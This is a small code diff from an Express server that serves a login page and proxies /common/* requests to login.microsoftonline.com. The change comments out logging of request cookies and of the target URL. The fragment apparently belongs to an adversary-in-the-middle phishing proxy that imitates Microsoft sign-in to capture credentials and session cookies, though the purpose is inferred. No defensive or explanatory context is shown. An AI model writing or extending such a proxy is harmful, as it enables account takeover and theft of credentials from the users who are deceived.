@@ -12,7 +12,7 @@ app.use(bodyParser.urlencoded({ extended: true }));
 // Serve the login page
 app.get("/", (req, res) => {
   res.sendFile(path.join(__dirname, "myfile.html"));
-  console.log("cookies:", req.headers.cookie);
+ // console.log("cookies:", req.headers.cookie);
 });
 
 //allows cors
@@ -43,7 +43,7 @@ app.get("/", (req, res) => {
 app.use("/common/*", async (req, res) => {
   try {
     const targetUrl = `https://login.microsoftonline.com${req.originalUrl}`;
-    console.log("Target URL:", targetUrl);
+    //console.log("Target URL:", targetUrl);
 
     const modifiedBody = req.body && Object.keys(req.body).length > 0 ? req.body : { action: "default" };
 
